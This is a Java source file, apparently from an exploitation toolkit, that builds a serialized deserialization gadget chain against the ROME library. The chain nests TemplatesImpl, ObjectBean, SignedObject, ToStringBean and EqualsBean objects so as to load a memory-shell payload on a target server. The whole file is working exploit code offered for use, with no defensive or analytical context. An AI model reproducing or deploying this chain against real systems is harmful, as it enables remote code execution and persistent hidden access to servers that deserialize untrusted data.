package main.exploit.payload;

import com.rometools.rome.feed.impl.EqualsBean;
import com.rometools.rome.feed.impl.ObjectBean;
import com.rometools.rome.feed.impl.ToStringBean;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import main.utils.ExpUtils;

import javax.xml.transform.Templates;
import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.security.*;
import java.util.HashMap;

public class Rome1_7Exp {
    public String memShell;
    public Class<?> memShellRunner;

    public Rome1_7Exp(String memShell){
        this.memShell = memShell;
        this.memShellRunner = ExpUtils.getMemShellRunner(memShell);
    }

    public byte[] exploit() throws Exception {
        TemplatesImpl templates = ExpUtils.getTemplatesImpl(memShell, memShellRunner);
        ObjectBean objectBean = new ObjectBean(Templates.class, templates);
        ObjectBean objectBean2 = new ObjectBean(ObjectBean.class, objectBean);
        HashMap hashMap = ExpUtils.makeMap(objectBean2, "aaa");
        KeyPairGenerator keyPairGenerator = KeyPairGenerator.getInstance("DSA");
        keyPairGenerator.initialize(1024);
        KeyPair keyPair = keyPairGenerator.genKeyPair();
        PrivateKey privateKey = keyPair.getPrivate();
        Signature signature = Signature.getInstance(privateKey.getAlgorithm());
        SignedObject signedObject = new SignedObject(hashMap, privateKey, signature);
        ToStringBean item = new ToStringBean(SignedObject.class, signedObject);
        EqualsBean equalsBean = new EqualsBean(ToStringBean.class, item);
        HashMap expMap = ExpUtils.makeMap(equalsBean, "aaa");
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(expMap);
        oos.flush();
        oos.close();
        return baos.toByteArray();
    }
}
